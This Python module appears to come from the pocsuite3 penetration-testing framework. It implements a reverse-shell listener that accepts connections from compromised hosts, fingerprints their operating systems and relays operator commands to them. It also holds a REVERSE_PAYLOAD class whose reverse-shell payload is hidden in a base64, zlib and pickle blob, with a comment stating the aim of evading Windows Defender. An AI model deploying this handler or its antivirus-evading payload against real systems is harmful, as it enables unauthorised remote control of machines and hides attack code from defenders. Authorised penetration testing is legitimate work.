import base64
import pickle
import zlib
import select
import socket
import threading
import time
import os
from pocsuite3.lib.utils import gen_cert
from pocsuite3.lib.core.common import data_to_stdout, has_poll, get_unicode, mosaic
from pocsuite3.lib.core.data import conf, kb, logger, paths
from pocsuite3.lib.core.datatype import AttribDict
from pocsuite3.lib.core.enums import AUTOCOMPLETE_TYPE, OS, CUSTOM_LOGGING
from pocsuite3.lib.core.exception import PocsuiteShellQuitException
from pocsuite3.lib.core.settings import DEFAULT_LISTENER_PORT
from pocsuite3.lib.core.shell import auto_completion, clear_history, save_history, load_history
from pocsuite3.lib.core.threads import exception_handled_function


def get_sock_listener(listen_port, listen_host="0.0.0.0", ipv6=False, protocol=None):
    if protocol in [None, "TCP"]:
        protocol = socket.SOCK_STREAM
    elif protocol in ["UDP"]:
        protocol = socket.SOCK_DGRAM

    if ipv6:
        s = socket.socket(socket.AF_INET6, protocol)
        if listen_host == "0.0.0.0":
            listen_host = "::"
    else:
        s = socket.socket(socket.AF_INET, protocol)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    msg = ''
    if conf.enable_tls_listener and protocol == socket.SOCK_STREAM:
        import ssl
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        cert_path = os.path.join(paths.POCSUITE_TMP_PATH, 'cacert.pem')
        gen_cert(filepath=cert_path)
        context.load_cert_chain(cert_path)
        s = context.wrap_socket(s, server_side=True)
        msg = 'TLS '
    try:
        s.bind((listen_host, listen_port))
    except socket.error:
        s.close()
        if conf.connect_back_host in kb.data.local_ips:
            logger.warn(f'unable to listen on {listen_host}:{listen_port}, check if the port is occupied.')
        return None

    if protocol == socket.SOCK_STREAM:
        msg += "listening on {0}:{1}".format(listen_host, listen_port)
        logger.log(CUSTOM_LOGGING.SYSINFO, msg)
        s.listen(5)
    return s


def get_udp_listener(listen_port=DEFAULT_LISTENER_PORT, listen_host="0.0.0.0", ipv6=False):
    return get_sock_listener(listen_port, listen_host, ipv6, "UDP")


def get_tcp_listener(listen_port=DEFAULT_LISTENER_PORT, listen_host="0.0.0.0", ipv6=False):
    return get_sock_listener(listen_port, listen_host, ipv6, "TCP")


def start_listener():
    t = threading.Thread(target=exception_handled_function, name="listener-thread", args=[listener_worker])
    t.setDaemon(True)
    t.start()


def listener_worker():
    s = get_tcp_listener(ipv6=conf.ipv6, listen_port=int(conf.connect_back_port))
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            client = AttribDict()
            client.conn = conn
            client.address = address
            kb.data.clients.append(client)
            info_msg = "new connection established from {0}".format(mosaic(address[0]))
            logger.log(CUSTOM_LOGGING.SUCCESS, info_msg)
        except Exception:
            pass


def list_clients():
    results = ''
    # https://en.wikipedia.org/wiki/Uname
    # https://en.wikipedia.org/wiki/Ver_(command)
    os_fingerprint = {
        'Linux': ['Linux', 'GNU'],
        'macOS': ['Darwin'],
        'Windows': ['Windows', 'PS ', 'C:\\', 'CYGWIN', 'MS-DOS', 'MSYS_NT', 'cmdlet'],
        'BSD': ['FreeBSD', 'OpenBSD', 'NetBSD', 'MidnightBSD'],
        'Solaris': ['SunOS']
    }
    for i, client in enumerate(kb.data.clients):
        try:
            client.conn.send(b'uname\nver\n')
            ret = poll_cmd_execute(client).lower()
            system, found = 'unknown', False
            for o, ks in os_fingerprint.items():
                if found:
                    break
                for k in ks:
                    if k.lower() in ret.lower():
                        system = o
                        found = True
                        break
        except Exception:  # If a connection fails, remove it
            del kb.data.clients[i]
            continue

        results += (f'{i}   ' + mosaic(client.address[0]) + f'     ({system})\n')
    data_to_stdout("----- Remote Clients -----" + "\n" + results)


def get_client(cmd):
    try:
        target = cmd.split(" ")[1]
        target = int(target)
        client = kb.data.clients[target]  # Connect to the selected clients
        data_to_stdout("Now Connected: {0}\n".format(mosaic(client.address[0])))
        return client
    except Exception:
        data_to_stdout("Invalid Client\n")
        return None


def send_shell_commands_for_console(client):
    module_prompt_default_template = (
        "\001\033[4m\002SHELL\001\033[0m\002 (\001\033[91m\002{hostname}\001\033[0m\002) > "
    )
    while True:
        cmd = None
        try:
            address = client.address[0]
            cmd = input(module_prompt_default_template.format(hostname=address))
            if not cmd:
                continue

            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")

            elif cmd.lower() in ("x", "q", "exit", "quit", "bye"):
                break

            client.conn.send(str.encode(cmd + '\n'))

            resp = poll_cmd_execute(client)

            data_to_stdout(resp)

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue

        except Exception as ex:
            logger.error(str(ex))
            data_to_stdout("Connection Lost\n")
            break
    return True


def send_shell_commands(client):
    auto_completion(AUTOCOMPLETE_TYPE.OS, OS.LINUX)
    while True:
        cmd = None
        try:
            address = client.address[0]
            cmd = input("{0}>: ".format(mosaic(address)))
            if not cmd:
                continue

            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)

            elif cmd.lower() in ("x", "q", "exit", "quit", "bye"):
                break

            client.conn.send(str.encode(cmd + '\n'))

            resp = poll_cmd_execute(client)

            data_to_stdout(resp)

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue

        except Exception as ex:
            logger.error(str(ex))
            data_to_stdout("Connection Lost\n")
            break


def poll_cmd_execute(client, timeout=3):
    if has_poll():
        p = select.poll()
        event_in_mask = select.POLLIN | select.POLLPRI
        event_err_mask = select.POLLERR
        event_closed_mask = select.POLLHUP | select.POLLNVAL
        event_mask = event_in_mask | event_err_mask | event_closed_mask
        p.register(client.conn, event_mask)
        count = 0
        ret = ''
        read_again = True
        while True:
            events = p.poll(100)
            if events:
                event = events[0][1]
                if event & select.POLLERR:
                    ret = "Client Hung up\n"
                    break

                ready = event & select.POLLPRI or event & select.POLLIN
                if not ready:
                    ret = "Command has no result or filtered by firewall\n"
                    break
                else:
                    time.sleep(0.05)
                    ret += get_unicode(client.conn.recv(65536))
            else:
                if ret:
                    if read_again:
                        read_again = False
                        continue
                    break
                elif count > timeout:
                    ret = "Command has no result or filtered by firewall\n"
                    break
                else:
                    data_to_stdout(".")
                    read_again = False
                    time.sleep(1)
                    count += 1

        p.unregister(client.conn)
    else:
        count = 0
        ret = ''
        read_again = True
        while True:
            ready = select.select([client.conn], [], [], 0.1)
            if ready[0]:
                time.sleep(0.05)
                ret += get_unicode(client.conn.recv(65536))
            else:
                if ret:
                    if read_again:
                        read_again = False
                        continue
                    break
                elif count > timeout:
                    ret = "Command has no result or filtered by firewall\n"
                else:
                    data_to_stdout('.')
                    read_again = False
                    time.sleep(1)
                    count += 1

    if ret and not ret.startswith('\r'):
        ret = "\r{0}".format(ret)
    if ret and not ret.endswith('\n'):
        ret = "{0}\n".format(ret)

    return ret


def print_cmd_help():
    msg = "-----   Help Menu  -----\n"
    msg += "command      description\n"
    msg += "list         list connected clients\n"
    msg += "select       select which client to send command\n"
    msg += "quit         quit shell\n"
    msg += "help         print help information\n"
    data_to_stdout(msg)


def handle_listener_connection_for_console(wait_time=3, try_count=3):
    while len(kb.data.clients) == 0:
        try:
            time.sleep(wait_time)
        except KeyboardInterrupt:
            break

    if len(kb.data.clients) > 0:
        cmd = "select 0"
        client = get_client(cmd)
        if client is not None:
            send_shell_commands_for_console(client)


def handle_listener_connection():
    _ = ["list", "select", "exit", "quit", "clear"]
    auto_completion(AUTOCOMPLETE_TYPE.POCSUITE, commands=_)

    while True:
        try:
            cmd = None
            cmd = input('shell>: ').strip()
            if not cmd:
                continue
            elif cmd.lower() in ("?", "help"):
                print_cmd_help()
            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)
            elif cmd.lower() in ("x", "q", "exit", "quit"):
                raise PocsuiteShellQuitException
            elif cmd == "list":
                list_clients()
            elif cmd.lower().split(" ")[0] in ('select', 'use'):
                client = get_client(cmd)
                if client is not None:
                    send_shell_commands(client)
            else:
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)
                load_history(AUTOCOMPLETE_TYPE.POCSUITE)
                data_to_stdout("Command Not Found... type ? for help.\n")

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue


class REVERSE_PAYLOAD:
    # Evading Windows Defender
    # Pocsuite3 is an open source security tool, not virus.
    # I believe that this is a false positive of your antivirus tool :)
    payload = (
        b'eJx9Vd9v4kYQTntpT7r3vlYji4O1agwBcQ9xQCIcadJSQJjr9YQQMvYSfAF7612a'
        b'IEBq3/3oPvbP6kv/if4LnfUPQkhUkOzd8cw33zeeWf9++mfj9Un820Uk/LLbisJ2'
        b'sISSWLLSzFjezdyZn+1sS6TLbWnqeiU+h6ILlUb+bOvZsCnvYHO2g0biEoWvuq1K'
        b'FH6Dj4oUsoDUK35ajcIzzFWcJagM03m+k26AQT4PB7jlxB6FX102zetyFH6b5G/k'
        b'oeTQ30rCZiX0LcW+yCkKT6VjFJKpJT1tKPx/QCGFRtLvjkLyt8LIW0tmvBC5fyYB'
        b'vh62O932EBGeCIPnygRdeFQ8V3fabw86Ufg3o8FCFq6w4hRM376jwsi5dQUDFCPH'
        b'6hhk8NhMTK1/NbnBtJrZa/04MYeDdvMn7ZYKFvjCn649a0mJgqQVVTXcGbF9z6O2'
        b'jJMAluMEE9cjOaa5yGhiCR83roq/zcZn1CPm8P1NV1MaeVNRjczS+zA8NrUHg8xE'
        b'H6hNlMcuQdNuZ8gC9T8Nr3vdKPyHrcXc9+Iiu0vmBwISORpfTZG4TTnXfG7wemLW'
        b'U7HprpkqTrcHwlWD65lCEpdLw1qhcp/rzopVCNdn7oJ6PlG1smrAC+azl80V1WD1'
        b'R3a6bS0WZJSpVDQFdY5VqfJV/7ofhe/ZnEExgEJOsqzP5DWu1SOrZ4WCi3wVO7Qq'
        b'x6qqxGCngw+Xn6LQDlbTNcIlirE1CrP6sNVPWkM/wtWFP3FjcOAscD0xO0ry1sEs'
        b'eKnIq6LN5F+VyX5o/tyMwr8CqMNg5Ql3SXXspHRJ1DcMHwR6TDuVLmdFirfxEmes'
        b'XTSOxyQ+Oy7yNdjC/RzrCQG1HFhgwxng+JCTK8mlhqxq0uRRZQwWB1Mg+9vRGBPr'
        b'95YrrvyAqFH4pt/72B6Y1+1OJ/rl3y9OTnL2wqWeQHJdel/sTT/j6wdzzQVd6l3Z'
        b'IHGZuI4Va8WepIDUCslLyHGBfJYYnMLo31NhxjaiGqPpWtDReJyTd45OZV1/V6tV'
        b'a9u3G8TYGbEigjMjARIofYD6SBKhQVmDZKl3qHcr5qoKRdRbxgEzco4lLAwkB7yL'
        b'wzWjXZzaTMGQPmDLm62bm7Zn+w5WRE0p4jJLI7O4Ugz1nKll30lQlz5AkkEe01j9'
        b'3koUkzA4cK3EzLO476DQN6GAd8LuHVXvW2IujQ0opCGYT6KPhORFU0rj8/OYYkzt'
        b'UlIijwn2RdY/Bq6gZI+DtPfrrDx736vFis+JijXOXkxr4XMqO+B1r9/umiYelX/I'
        b'ozZIz1r+5JvFt9uDk5cDMw6HIDXGHzA5P5wvgE/SRir+unLlmKVHiTyoz7FZGmmW'
        b'Jzmjlf4ftlBYwg=='
    )

    vars().update(pickle.loads(zlib.decompress(base64.b64decode(payload))))
    del payload


if __name__ == "__main__":
    start_listener()
